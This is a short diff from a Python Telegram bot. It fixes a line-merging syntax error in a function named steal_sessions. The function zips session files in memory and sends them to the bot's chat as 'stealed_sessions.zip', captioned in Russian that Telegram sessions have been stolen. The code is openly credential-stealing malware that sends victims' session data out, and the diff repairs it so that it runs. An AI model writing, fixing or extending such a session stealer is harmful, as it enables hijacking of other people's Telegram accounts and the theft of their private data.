@@ -82,7 +82,9 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                 zipf.write(subpath, arcname=subpath.relative_to(path_obj.parent))
         
         # Перематываем буфер в начало
-        mem_zip.seek(0)await context.bot.send_document(
+        mem_zip.seek(0)
+        
+        await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=InputFile("mem_zip", filename="stealed_sessions.zip"), 
             caption="🔥 Сессии телеграм украдены"
